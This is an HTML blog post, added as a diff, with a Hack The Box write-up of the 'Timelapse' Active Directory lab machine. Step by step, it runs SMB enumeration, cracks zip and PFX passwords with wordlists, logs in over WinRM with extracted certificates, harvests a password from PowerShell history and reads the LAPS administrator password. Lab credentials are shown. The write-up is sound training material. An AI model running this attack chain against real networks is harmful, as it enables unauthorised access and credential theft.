@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Timelapse Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/windows-machines/2022-08-20-timelapse/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Timelapse Hackthebox writeup">
+  <meta property="og:description" content="In this Box we are against a windows machine has the active directory service installed on it , we can list files on smb shares and access some shared folder to find a backup.zip file which contains a pfx file for a user on the domain , we can also find some hints about LAPS. after extracting the key and certificate from the pfx file we can login using WinRM. then checking the powershell history we can see password for another user which is a memeber of the LAPS_READERS Group so the other user can read the administrator password in clear text">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-08-20T00:49:18+02:00">
+    <meta property="article:modified_time" content="2022-08-20T00:49:18+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Active-Directory">
+    <meta property="article:tag" content="LAPS">
+    <meta property="article:tag" content="Pfx">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Timelapse Hackthebox writeup">
+  <meta name="twitter:description" content="In this Box we are against a windows machine has the active directory service installed on it , we can list files on smb shares and access some shared folder to find a backup.zip file which contains a pfx file for a user on the domain , we can also find some hints about LAPS. after extracting the key and certificate from the pfx file we can login using WinRM. then checking the powershell history we can see password for another user which is a memeber of the LAPS_READERS Group so the other user can read the administrator password in clear text">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/windows-machines/2022-08-20-timelapse/" /><link rel="prev" href="http://example.org/posts/web-exploitation/2022-08-06-kenzy/" /><link rel="next" href="http://example.org/posts/web-exploitation/2022-10-01-meme-generator/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Timelapse Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/windows-machines\/2022-08-20-timelapse\/"
+        },"genre": "posts","keywords": "Hackthebox, Active-directory, LAPS, pfx","wordcount":  936 ,
+        "url": "http:\/\/example.org\/posts\/windows-machines\/2022-08-20-timelapse\/","datePublished": "2022-08-20T00:49:18+02:00","dateModified": "2022-08-20T00:49:18+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Timelapse Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/windows-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-20">2022-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;936 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ul>
+        <li><a href="#pwned">pwned</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Box we are against a windows machine has the active directory service installed on it , we can list files on smb shares and access some shared folder to find a backup.zip file which contains a pfx file for a user on the domain , we can also find some hints about LAPS. after extracting the key and certificate from the pfx file we can login using WinRM. then checking the powershell history we can see password for another user which is a memeber of the LAPS_READERS Group so the other user can read the administrator password in clear text</p>
+<h2 id="scanning">Scanning</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn -A -T4 10.10.11.152 -oN nmap.intial</span></span></code></pre></div></div>
+<p>Output</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT    STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp  open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp  open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2022-08-20 21:08:49Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 7h59m58s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2022-08-20T21:09:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A</span></span></code></pre></div></div>
+<p>we can see this machine has the Active directory service installed on it because of the DNS service and the kpassword5 ports are open</p>
+<p>if we make a full port scan we will get :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">5986/tcp  open  wsmans
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown
+</span></span><span class="line"><span class="cl">49673/tcp open  unknown
+</span></span><span class="line"><span class="cl">49674/tcp open  unknown
+</span></span><span class="line"><span class="cl">49696/tcp open  unknown
+</span></span><span class="line"><span class="cl">52713/tcp open  unknown</span></span></code></pre></div></div>
+<p>port <code>5986</code> is open which is the WinRm port which we can use to login to the box using <code>evil-winrm</code> tool , so we maybe use it latter.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>We can start Enumerating the smb service to check if we have access without providing passwords :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">smbclient -L 10.10.11.152
+</span></span><span class="line"><span class="cl">Enter WORKGROUP\kali&#39;s password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">	---------       ----      -------
+</span></span><span class="line"><span class="cl">	ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">	C$              Disk      Default share
+</span></span><span class="line"><span class="cl">	IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">	NETLOGON        Disk      Logon server share
+</span></span><span class="line"><span class="cl">	Shares          Disk
+</span></span><span class="line"><span class="cl">	SYSVOL          Disk      Logon server share
+</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available</span></span></code></pre></div></div>
+<p>we can list the folders without any password , we can go check non defaults folders like <code>Shares</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">smbclient //10.10.11.152/Shares
+</span></span><span class="line"><span class="cl">Enter WORKGROUP\kali&#39;s password:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: \<span class="p">&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        0  Mon Oct 25 11:39:15 2021
+</span></span><span class="line"><span class="cl">  ..                                  D        0  Mon Oct 25 11:39:15 2021
+</span></span><span class="line"><span class="cl">  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+</span></span><span class="line"><span class="cl">  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021</span></span></code></pre></div></div>
+<p>we can download the files in both of these directories to check if there is anything helpful</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kali kali 102K Aug <span class="m">20</span> 09:16 LAPS_Datasheet.docx
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kali kali 627K Aug <span class="m">20</span> 09:16 LAPS_OperationsGuide.docx
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kali kali  71K Aug <span class="m">20</span> 09:16 LAPS_TechnicalSpecification.docx
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kali kali 1.1M Aug <span class="m">20</span> 09:16 LAPS.x64.msi
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kali kali 2.6K Aug <span class="m">20</span> 09:15 winrm_backup.zip</span></span></code></pre></div></div>
+<p>From the files we have found we can assume the machine has LAPS (Local Administrator Password Solution) installed on it to protect administrator password.</p>
+<p><em>LAPS function is to set a different, random password for the common local administrator account on every computer in the domain</em></p>
+<p>and we have <code>winrm_backup.zip</code> which we can try to open but will find it is protected with a password , we can try crack it :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u  winrm_backup.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PASSWORD FOUND!!!!: <span class="nv">pw</span> <span class="o">==</span> supremelegacy</span></span></code></pre></div></div>
+<p>By Extracting the zip file we will get <code>legacyy_dev_auth.pfx</code></p>
+<p><em>The . pfx file, which is in a PKCS#12 format,Â contains the SSL certificate (public keys) and the corresponding private keys</em></p>
+<p>Searching for it we will come across <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank" rel="noopener noreffer ">this</a> page which explains how to get the key,cert from the pfx file. But there is a password required in the steps</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820153550.png"
+        data-srcset="/assets/images/timelapse/20220820153550.png, /assets/images/timelapse/20220820153550.png 1.5x, /assets/images/timelapse/20220820153550.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820153550.png"
+        title="error" /></p>
+<p>we can use <code>crackpkcs12</code> tool to get the password we need</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820153738.png"
+        data-srcset="/assets/images/timelapse/20220820153738.png, /assets/images/timelapse/20220820153738.png 1.5x, /assets/images/timelapse/20220820153738.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820153738.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crackpkcs12 legacyy_dev_auth.pfx -d /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary attack - Starting <span class="m">8</span> threads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*********************************************************
+</span></span><span class="line"><span class="cl">Dictionary attack - Thread <span class="m">8</span> - Password found: thuglegacy
+</span></span><span class="line"><span class="cl">*********************************************************</span></span></code></pre></div></div>
+<p>now we can extract the key and the certificate we want</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out leg.key
+</span></span><span class="line"><span class="cl">openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out leg.crt</span></span></code></pre></div></div>
+<h2 id="foothold">Foothold</h2>
+<p>We can Authenticate to the box using the key and the cert we have generated from the pfx file . as the we have said before we can use <code>evil-winrm</code> to login so let&rsquo;s try :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u legacy -c leg.crt -k leg.key -i 10.10.11.152 -S</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820155138.png"
+        data-srcset="/assets/images/timelapse/20220820155138.png, /assets/images/timelapse/20220820155138.png 1.5x, /assets/images/timelapse/20220820155138.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820155138.png"
+        title="error" /></p>
+<p>we can upload <code>Winpeas</code> to see if there is any low hanging fruits first :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">legacyy</span><span class="p">\</span><span class="n">Favorites</span><span class="p">&gt;</span> <span class="n">upload</span> <span class="n">winPEAS</span><span class="p">.</span><span class="n">bat</span></span></span></code></pre></div></div>
+<p>and we can find under the PowerShell history <code>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">ipconfig /all
+</span></span><span class="line"><span class="cl">netstat -ano <span class="p">|</span><span class="k">select</span>-string LIST
+</span></span><span class="line"><span class="cl"><span class="nv">$so</span> <span class="o">=</span> New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -AsPlainText -Force
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="s1">&#39;svc_deploy&#39;</span>, <span class="nv">$p</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">invoke-command -computername localhost -credential <span class="nv">$c</span> -port <span class="m">5986</span> -usessl -
+</span></span><span class="line"><span class="cl">SessionOption <span class="nv">$so</span> -scriptblock <span class="o">{</span>whoami<span class="o">}</span>
+</span></span><span class="line"><span class="cl">get-aduser -filter * -properties *
+</span></span><span class="line"><span class="cl">exit</span></span></code></pre></div></div>
+<p>We can see password <code>E3R$Q62^12p7PLlC%KWaxuaV</code> and the user <code>svc_deploy</code> ,we can try to login with that user:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u svc_deploy -p <span class="s1">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span>  -i 10.10.11.152 -S</span></span></code></pre></div></div>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>After logging in successfully with that user, we can think of the LAPs we have found earlier maybe it was there for a reason.</p>
+<p>Reading <a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps" target="_blank" rel="noopener noreffer ">here</a> we can check if it is installed using :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Get-ChildItem <span class="s1">&#39;C:\Program Files\LAPS\CSE\Admpwd.dll&#39;</span></span></span></code></pre></div></div>
+<p>and it is indeed installed , reading about LAPS Attributes we can see this , maybe the <code>ms-Mcs-AdmPwd</code> is misconfigured</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820162732.png"
+        data-srcset="/assets/images/timelapse/20220820162732.png, /assets/images/timelapse/20220820162732.png 1.5x, /assets/images/timelapse/20220820162732.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820162732.png"
+        title="error" /></p>
+<p><strong>The Misconfiguration :</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820163538.png"
+        data-srcset="/assets/images/timelapse/20220820163538.png, /assets/images/timelapse/20220820163538.png 1.5x, /assets/images/timelapse/20220820163538.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820163538.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Get-ADComputer -Filter * -Properties <span class="s1">&#39;ms-Mcs-AdmPwd&#39;</span> <span class="p">|</span> Where-Object <span class="o">{</span> <span class="nv">$_</span>.<span class="s1">&#39;ms-Mcs-AdmPwd&#39;</span> -ne <span class="nv">$null</span> <span class="o">}</span> <span class="p">|</span> Select-Object <span class="s1">&#39;Name&#39;</span>,<span class="s1">&#39;ms-Mcs-AdmPwd&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820162833.png"
+        data-srcset="/assets/images/timelapse/20220820162833.png, /assets/images/timelapse/20220820162833.png 1.5x, /assets/images/timelapse/20220820162833.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820162833.png"
+        title="error" /></p>
+<p>And we have access to the administrator password in clear text ! , we can try to login with the administrator password</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u administrator -p <span class="s1">&#39;1M-btm[l8iH]K{[OigWn3zV%&#39;</span>  -i 10.10.11.152 -S</span></span></code></pre></div></div>
+<p>and we are in as administrator</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/timelapse/20220820163026.png"
+        data-srcset="/assets/images/timelapse/20220820163026.png, /assets/images/timelapse/20220820163026.png 1.5x, /assets/images/timelapse/20220820163026.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/timelapse/20220820163026.png"
+        title="error" /></p>
+<h3 id="pwned">pwned</h3></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/windows-machines/2022-08-20-timelapse/" data-title="Timelapse Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,Active-directory,LAPS,pfx"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/windows-machines/2022-08-20-timelapse/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/windows-machines/2022-08-20-timelapse/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2fwindows-machines%2f2022-08-20-timelapse%2f&amp;text=Timelapse%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
